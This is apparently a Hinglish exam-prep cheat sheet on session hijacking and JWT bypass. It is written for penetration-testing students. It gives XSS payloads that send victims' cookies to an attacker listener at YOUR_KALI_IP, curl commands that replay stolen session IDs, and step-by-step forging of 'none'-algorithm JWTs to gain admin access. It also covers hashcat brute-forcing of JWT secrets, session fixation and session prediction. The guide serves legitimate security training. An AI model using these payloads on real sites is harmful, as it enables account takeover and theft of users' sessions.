# SESSION HIJACKING / JWT BYPASS

---

## Pehle Samjho: Session Kya Hai?

HTTP protocol **stateless** hai — matlab server ko yaad nahi rehta ki tum kaun ho. Har request ek nayi request hai.

**Toh login kaise kaam karta hai?** Sessions se!

```
1. Tum login karte ho (username + password)
2. Server verify karta hai — sahi hai!
3. Server ek unique SESSION ID generate karta hai (jaise: PHPSESSID=abc123xyz789)
4. Ye session ID tumhare browser ko cookie mein de deta hai
5. Ab har request ke saath browser ye cookie bhejta hai
6. Server cookie dekhke pehchanta hai: "Achha, ye toh wahi logged-in user hai!"
```

**Session hijacking** matlab hai ki tum kisi aur ka session ID chura lo — phir server tumhe uss user samjhega!

**Session ID kahan hota hai?**
- **Cookies:** `PHPSESSID`, `JSESSIONID`, `session_id` — sabse common
- **URL mein:** `?session=abc123` (insecure but exists)
- **JWT Token:** Header mein `Authorization: Bearer eyJhbG...` — modern applications mein

---

## CASE 1: Cookie Steal via XSS — Sabse Common Method

**Concept:** XSS vulnerability use karke victim ka `document.cookie` apne server pe bhejo.

### Step 1: Listener Start Karo (Apne Kali Pe)
```bash
# Method 1: Python HTTP server
python3 -m http.server 8888

# Method 2: Netcat
nc -lvnp 8888
```

### Step 2: XSS Payload Inject Karo

```html
<!-- Redirect method (victim ko pata chalega) -->
<script>document.location='http://YOUR_KALI_IP:8888/?c='+document.cookie</script>

<!-- Image method (stealthy — victim ko pata nahi chalega) -->
<script>new Image().src='http://YOUR_KALI_IP:8888/?c='+document.cookie</script>

<!-- Fetch method (modern) -->
<script>fetch('http://YOUR_KALI_IP:8888/?c='+document.cookie)</script>

<!-- img tag (agar script blocked hai) -->
<img src=x onerror="new Image().src='http://YOUR_KALI_IP:8888/?c='+document.cookie">
```

### Step 3: Cookie Receive Karo
Listener pe ye aayega:
```
GET /?c=PHPSESSID=a1b2c3d4e5f6g7h8i9 HTTP/1.1
```
`PHPSESSID=a1b2c3d4e5f6g7h8i9` — ye hai churaya hua session!

### Step 4: Session Use Karo (Hijack!)
```
Browser mein target website kholo
DevTools kholo (F12) → Application tab → Cookies
PHPSESSID ki value badlo: a1b2c3d4e5f6g7h8i9
Page refresh karo
Ab tum victim ke account mein ho!
```

**Ya curl se:**
```bash
curl -b "PHPSESSID=a1b2c3d4e5f6g7h8i9" http://target.com/dashboard.php
```

---

## CASE 2: PCAP Se Session Cookie Nikalo

Exam mein PCAP file milti hai — usme se session extract karo.

### Wireshark Method:
```
1. PCAP open karo Wireshark mein
2. Filter lagao: http.cookie
3. Packets mein dekho — Cookie header mein session ID hoga
4. Right-click → Copy → Value
```

### tshark Method (CLI):
```bash
# Saari cookies nikalo
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie | head -20

# Specific session ID dhundho
tshark -r capture.pcap -Y "http.cookie contains PHPSESSID" -T fields -e ip.src -e http.cookie

# Set-Cookie bhi check karo (server ne kya bheja)
tshark -r capture.pcap -Y "http.set_cookie" -T fields -e ip.dst -e http.set_cookie

# Login request dhundho (POST with credentials)
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e ip.src -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
```

**Output example:**
```
192.168.1.5    PHPSESSID=xyz789abc123; user=admin
```

### Session Hijack Karo:
```bash
# Browser mein set karo (DevTools → Cookies)
# Ya curl se:
curl -b "PHPSESSID=xyz789abc123" http://target.com/admin/dashboard.php
```

---

## CASE 3: JWT Structure — Samjho Pehle

**JWT = JSON Web Token.** Modern alternative hai session cookies ka.

JWT 3 parts ka hota hai, dot (.) se separated:
```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature_here
|______HEADER______|.|______PAYLOAD______|.|___SIGNATURE___|
```

### Header (Base64 encoded):
```json
{"alg":"HS256","typ":"JWT"}
```
`alg` = kaunsa algorithm use hua signing ke liye

### Payload (Base64 encoded):
```json
{"user":"guest","role":"user","iat":1234567890}
```
Ye hai actual data — user info, role, expiry time etc.

### Signature:
```
HMACSHA256(base64(header) + "." + base64(payload), SECRET_KEY)
```
Server SECRET_KEY se sign karta hai — agar koi payload change kare toh signature match nahi hoga = REJECTED!

### JWT Decode Kaise Karo:
```bash
# Header decode
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# Output: {"alg":"HS256"}

# Payload decode
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d
# Output: {"user":"guest"}

# Ya online: jwt.io pe paste karo (exam mein allowed hai)
```

---

## CASE 4: JWT None Algorithm Bypass — Step by Step

**Ye kya hai?** Kuch servers "none" algorithm accept karte hain — matlab signature ki zarurat nahi! Tum payload change karke bina signature ke bhej sakte ho!

### Step 1: Current JWT Decode Karo
```bash
# Suppose tumhara JWT ye hai:
# eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc123signature

# Header decode:
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}  ← algorithm HS256 hai

# Payload decode:
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d
# {"user":"guest"}  ← tum guest ho, admin banana hai!
```

### Step 2: Header Change Karo — Algorithm "none" Karo
```bash
# New header: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

### Step 3: Payload Change Karo — Admin Ban Jao
```bash
# New payload: {"user":"admin"}
echo -n '{"user":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'
# Output: eyJ1c2VyIjoiYWRtaW4ifQ

# Ya role change karo:
echo -n '{"user":"admin","role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'
# Output: eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ
```

### Step 4: Naya JWT Banao — Signature EMPTY!
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```
**Note:** End mein dot (.) hai lekin uske baad KUCH NAHI — signature empty hai!

### Step 5: Naya JWT Use Karo
```bash
# Browser DevTools → Application → Cookies/Local Storage mein JWT replace karo
# Ya curl se:
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." http://target.com/admin

# Ya Cookie mein:
curl -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." http://target.com/admin
```

### None Algorithm Variations (agar ek nahi chale):
```bash
# Try different "none" variations:
echo -n '{"alg":"none"}' | base64 | tr -d '='
echo -n '{"alg":"None"}' | base64 | tr -d '='
echo -n '{"alg":"NONE"}' | base64 | tr -d '='
echo -n '{"alg":"nOnE"}' | base64 | tr -d '='
```

---

## CASE 5: JWT Other Attacks

### HS256 with Known Secret
```bash
# Agar secret key pata hai (jaise "secret", "password", default keys)
# jwt_tool ya PyJWT use karo:

pip install PyJWT
python3 -c "
import jwt
token = jwt.encode({'user':'admin','role':'admin'}, 'secret', algorithm='HS256')
print(token)
"
```

### JWT Brute Force Secret Key
```bash
# hashcat se:
# Pehle JWT hash format mein convert karo
echo "eyJhbG...FULL_JWT_HERE" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Ya jwt_tool se:
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

### Algorithm Confusion (RS256 → HS256)
```bash
# Server RS256 (public/private key) use karta hai
# Tum public key leke HS256 (symmetric) mein sign kar do
# Server public key se verify karega = match!
# Ye advanced hai — jwt_tool ya manual script se
```

---

## CASE 6: Session Prediction / Fixation

### Session Prediction:
```bash
# Multiple baar login karo aur session IDs collect karo:
# Session1: abc001
# Session2: abc002
# Session3: abc003
# Pattern dikha? Next: abc004 — predict karo aur try karo!

# Burp Suite Sequencer use karo:
# Capture login response → Send to Sequencer → Start live capture → Analyze
# Low entropy = predictable = vulnerable!
```

### Session Fixation:
```
1. Attacker ek session ID generate karta hai: SESSION=evil123
2. Victim ko ye URL bhejta hai: http://target.com/login?SESSION=evil123
3. Victim login karta hai — server same session ID use karti hai
4. Attacker ke paas session ID already hai (evil123) = hijacked!
```

---

## Common Mistakes (Mat Karna Ye)

1. **JWT ke last mein dot nahi lagaya:** None algorithm bypass mein `header.payload.` — last dot zaruri hai (empty signature)
2. **Base64 padding (=) nahi hataya:** JWT mein `=` signs hata do — `tr -d '='` use karo
3. **Cookie name galat:** PHPSESSID ho ya JSESSIONID ya custom — sahi naam pata karo
4. **Listener start nahi kiya:** XSS cookie steal mein pehle nc/python server start karo
5. **JWT decode mein + aur / ko handle nahi kiya:** JWT Base64URL use karta hai — `+` → `-`, `/` → `_`
6. **PCAP mein galat filter:** `http.cookie` for requests, `http.set_cookie` for responses — dono alag hain

---

## Quick Decision Tree

```
Session hijacking question?
  │
  ├─ XSS se cookie steal karna hai?
  │    ├─ Listener start karo (nc/python)
  │    ├─ Payload: document.location='http://IP:PORT/?c='+document.cookie
  │    ├─ Cookie receive karo
  │    └─ Browser DevTools mein set karo → refresh → hijacked!
  │
  ├─ PCAP se session nikalna hai?
  │    ├─ Wireshark: http.cookie filter
  │    ├─ tshark: -Y "http.cookie" -T fields -e http.cookie
  │    └─ Cookie value copy karo → browser mein set karo
  │
  ├─ JWT token dikha?
  │    ├─ Decode karo: echo "..." | base64 -d
  │    ├─ None bypass try karo:
  │    │    ├─ Header mein alg:"none" set karo
  │    │    ├─ Payload mein user:"admin" karo
  │    │    ├─ Signature empty rakho (last dot ke baad kuch nahi)
  │    │    └─ New JWT bhejo request mein
  │    └─ Secret brute force: hashcat -m 16500
  │
  ├─ Session prediction?
  │    └─ Multiple sessions collect karo → pattern dhundho → predict karo
  │
  └─ Tool name puchha?
       ├─ Cookie steal → XSS + listener
       ├─ PCAP analysis → Wireshark/tshark
       ├─ JWT attack → jwt_tool / manual
       └─ Session analysis → Burp Sequencer
```
